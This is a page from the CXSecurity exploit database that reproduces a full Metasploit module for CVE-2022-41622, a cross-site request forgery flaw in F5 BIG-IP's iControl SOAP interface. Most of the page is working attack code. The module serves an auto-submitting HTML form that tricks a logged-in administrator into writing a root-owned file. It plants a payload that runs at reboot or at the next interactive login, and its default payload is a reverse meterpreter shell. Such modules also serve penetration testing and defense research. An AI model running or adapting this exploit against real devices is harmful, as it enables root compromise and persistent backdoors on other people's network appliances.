---
title: F5 BIG-IP iControl Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2022110036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-22
fetch_date: 2025-10-03T23:21:23.062312
---

# F5 BIG-IP iControl Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **F5 BIG-IP iControl Cross Site Request Forgery** **2022.11.21**  Credit:  **[Ron Bowes](https://cxsecurity.com/author/Ron%2BBowes/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpServer::HTML
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'F5 BIG-IP iControl CSRF File Write SOAP API',
'Description' => %q{
This module exploits a cross-site request forgery (CSRF) vulnerability
in F5 Big-IP's iControl interface to write an arbitrary file to the
filesystem.
While any file can be written to any location as root, the
exploitability is limited by SELinux; the vast majority of writable
locations are unavailable. By default, we write to a script that
executes at reboot, which means the payload will execute the next time
the server boots.
An alternate target - Login - will add a backdoor that executes next
time a user logs in interactively. This overwrites a file,
but we restore it when we get a session
Note that because this is a CSRF vulnerability, it starts a web
server, but an authenticated administrator must visit the site, which
redirects them to the target.
},
'Author' => [
'Ron Bowes' # Discovery, PoC, and module
],
'References' => [
['CVE', '2022-41622'],
['URL', 'https://github.com/rbowes-r7/refreshing-soap-exploit'],
['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
['URL', 'https://support.f5.com/csp/article/K97843387'],
['URL', 'https://support.f5.com/csp/article/K94221585'],
['URL', 'https://support.f5.com/csp/article/K05403841'],
],
'License' => MSF\_LICENSE,
'DisclosureDate' => '2022-11-16', # Vendor advisory
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD],
'Type' => :unix\_cmd,
'Privileged' => true,
'Targets' => [
[ 'Restart', {}, ],
[ 'Login', {}, ],
[ 'Custom', {}, ]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true,
'Payload' => 'cmd/unix/python/meterpreter/reverse\_tcp'
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [
IOC\_IN\_LOGS,
ARTIFACTS\_ON\_DISK
]
}
)
)
register\_options(
[
OptString.new('TARGET\_HOST', [true, 'The IP or domain name of the target F5 device']),
OptString.new('TARGET\_URI', [true, 'The URI of the SOAP API', '/iControl/iControlPortal.cgi']),
OptBool.new('TARGET\_SSL', [true, 'Use SSL for the upstream connection?', true]),
OptString.new('FILENAME', [false, 'The file on the target to overwrite (for "custom" target) - note that SELinux prevents overwriting a great deal of useful files']),
]
)
end
def on\_request\_uri(socket, \_request)
if datastore['TARGET'] == 0 # restart
filename = '/shared/f5\_update\_action'
file\_payload = <<~EOT
UpdateAction
https://localhost/success`#{payload.encoded}`
https://localhost/error
0
0
0
0
EOT
# Delete the logfile if we get a session
register\_file\_for\_cleanup('/var/log/f5\_update\_checker.out')
print\_status("Redirecting the admin to overwrite #{filename}; if successful, your session will come approximately 2 minutes after the target is rebooted")
elsif datastore['TARGET'] == 1 # login
filename = '/var/run/config/timeout.sh'
file\_payload = "#{payload.encoded} & disown;"
# Delete the backdoored file if we get a session.. this will be fixed at
# next reboot
register\_file\_for\_cleanup('/var/run/config/timeout.sh')
print\_status("Redirecting the admin to overwrite #{filename}; if successful, your session will come the next time a user logs in interactively")
else # Custom
filename = datastore['FILENAME']
file\_payload = payload.encoded
print\_status("Redirecting the admin to overwrite #{filename} with the payload")
end
# Build the SOAP request that'll be sent to the target server
csrf\_payload = %(
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:con="urn:iControl:System/ConfigSync">
<soapenv:Header/>
<soapenv:Body>
<con:upload\_file soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<file\_name xsi:type="xsd:string">#{filename}</file\_name>
<file\_context xsi:type="urn:System.ConfigSync.FileTransferContext" xmlns:urn="urn:iControl">
<!--type: Common.OctetSequence-->
<file\_data xsi:type="urn:Common.OctetSequence">#{Rex::Text.encode\_base64(file\_payload)}</file\_data>
<chain\_type xsi:type="urn:Common.FileChainType">FILE\_FIRST\_AND\_LAST</chain\_type>
</file\_context>
</con:upload\_file>
</soapenv:Body>
</soapenv:Envelope>
)
# Build the target URL
target\_url = "#{datastore['TARGET\_SSL'] ? 'https' : 'http'}://#{datastore['TARGET\_HOST']}#{datastore['TARGET\_URI']}"
# Build the HTML payload that'll send the SOAP request via the user's browser
html\_payload = %(
<html>
<body>
<form action="#{target\_url}" method="POST" enctype="text/plain">
<textarea id="payload" name="&lt;!--">--&gt;#{Rex::Text.html\_encode(csrf\_payload)}</textarea>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
)
# Send the HTML to the browser
send\_response(socket, html\_payload, { 'Content-Type' => 'text/html' })
end
def exploit
# Sanity check
if datastore['TARGET'] == 2 && (!datastore['FILENAME'] || datastore['FILENAME'].empty?)
fail\_with(Failure::BadConfig, 'For custom targets, please provide the FILENAME')
end
print\_good('Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below')
super
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine ...